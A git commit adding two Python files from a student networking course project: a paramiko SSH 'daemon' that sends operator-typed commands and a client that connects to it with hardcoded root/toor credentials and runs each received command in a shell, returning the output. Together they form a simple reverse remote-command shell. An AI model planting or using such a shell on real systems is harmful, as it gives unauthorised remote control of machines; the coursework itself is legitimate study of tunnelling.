86b55702f25c71016f6df1f34c6e889d8e4c977c
Alistair Godwin <godwinalistair@hotmail.com>
2020-03-22 19:14:33 -0400

    Add files via upload

--- test_client.py
+++ test_client.py
@@ -1,21 +1,64 @@
+# test_client.py
+
+#==============================================================================
+ #   Assignment:  Major Project - Tunelling Milestone 1
+ #
+ #       Author:  Alistair Godwin, Micheal Sciortino, Francesso Losi
+ #     Language:  Python 3
+ #                      
+ #   To Compile: Paramiko must be available 
+ #
+ #    Class:  DPI912 
+ #    Professor:  Harvey Kaduri
+ #    Due Date:  Mar 24th 2020 
+ #    Submitted: Mar 22nd 2020
+ #
+ #-----------------------------------------------------------------------------
+ #
+ #  Description: This program is a skeleton client that connects to an ssh server using paramiko. It awaits connections and prompts on a connection to execute shell commands onto the target client.
+ #      
+ #        Input:  N/A
+ #
+ #       Output:  Outputs to console results of command executed
+ #
+ #    Algorithm:  Invokes the Paramiko supplied functions to create and manage a connection to an SSH server. Continously request new commands and then send them to the target client. Await for 
+ #               
+ #             
+ #   Required Features Not Included: N/A
+ #
+ #   Known Bugs:  N/A 
+ #      
+ #
+ #   Classification: N/A
+ #
+#==============================================================================
 import paramiko
 import threading
 import subprocess
+import sys
 client = paramiko.SSHClient()
 client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
-client.connect('localhost',port=9000, username='root', password='toor')
+client.connect('::1',port=9000, username='root', password='toor')
 chan = client.get_transport().open_session()
-chan.send('Hey i am connected :)')
+chan.send('Hello? Yes this is client calling via SSH!')
 print(chan.recv(1024))
 
 while True:
     command = chan.recv(1024)
+    command = command.decode()
     print("Executing this -->" + str(command))
+    result = str(command)
     try:
+        # safe escape in case the server leaves us 
+        if (result == 'stop' or result == ''):
+            client.close()
+            sys.exit(0)
+        #exec this command, in future this would be os.system()
         proc = subprocess.check_output(command, shell=True)
         chan.send(proc)
     except Exception as e:
-        chan.send(str(e))
+        print("An Error or interuption occurred. Continue As normal")
+        chan.send('An Error or interuption occurred. Continue As normal')
 
 
 client.close()
--- test_daemon.py
+++ test_daemon.py
@@ -1,9 +1,66 @@
+# test_daemon.py
+
+#==============================================================================
+ #   Assignment:  Major Project - Tunelling Milestone 1
+ #
+ #       Author:  Alistair Godwin, Micheal Sciortino, Francesso Losi
+ #     Language:  Python 3
+ #                      
+ #   To Compile: Paramiko must be available 
+ #
+ #    Class:  DPI912 
+ #    Professor:  Harvey Kaduri
+ #    Due Date:  Mar 24th 2020 
+ #    Submitted: Mar 22nd 2020
+ #
+ #-----------------------------------------------------------------------------
+ #
+ #  Description: This program is a skeleton daemon that acts as an ssh server using paramiko. It awaits connections and prompts on a connection to execute shell commands onto the target client.
+ #      
+ #        Input:  N/A
+ #
+ #       Output:  Outputs to console results of command executed
+ #
+ #    Algorithm:  Invokes the Paramiko supplied functions to create and manage an SSH server. Continously request new commands and then send them to the target client. Await for 
+ #               
+ #             
+ #   Required Features Not Included: N/A
+ #
+ #   Known Bugs:  N/A 
+ #      
+ #
+ #   Classification: N/A
+ #
+#==============================================================================
+
+
+
 import socket
 import paramiko
 import threading
 import sys
 
 host_key = paramiko.RSAKey(filename='test_rsa.key')
+
+def getBinds():
+    '''
+    This function grabs the binding arguements for the connection
+    In the clients case, this is the IPv6 address and the socket #
+    return tuple - The connection properties 
+    '''
+    sockNum = -1
+    sockIp = ""
+    while sockNum < 0 and not sockIp:
+        try: 
+            sockNumTest = int(input("Provide a socket # for the daemon to host:"))
+            sockIpTest = str(input("Provide an IPv6 addresss to host on:"))
+        except Exception:
+            print("Please Try Again...\n")
+        else:
+            sockNum = sockNumTest   
+            sockIp = sockIpTest     
+
+    return (sockIpTest, sockNumTest)
 
 class Server (paramiko.ServerInterface):
    def _init_(self):
@@ -20,13 +77,15 @@ class Server (paramiko.ServerInterface):
 try:
     sock = socket.socket(socket.AF_INET6, socket.SOCK_STREAM)
     sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
-    sock.bind(('localhost', 9000))
+    sock.bind(getBinds())
     sock.listen(100)
     print('[+] Listening for connection ...')
     client, addr = sock.accept()
 except Exception as  e:
     print('[-] Listen/bind/accept failed: ' + str(e))
     sys.exit(1)
+    
+    
 print('[+] Got a connection!')
 
 try:
@@ -46,13 +105,18 @@ try:
     chan = t.accept(20)
     print('[+] Authenticated!')
     print(chan.recv(1024))
-    chan.send('Yeah i can see this')
+    chan.send('Greetings from the server!')
     while True:
       command= input("Enter command: ").strip('\n')
+      if (command == 'stop'):
+            chan.send('stop')
+            t.close()
+            sys.exit(0)
       chan.send(command)
       results = chan.recv(1024)
+      results.decode()
       print(results)
-
+      
 except Exception as e:
     print('[-] Caught exception: '  + str(e))
     try:
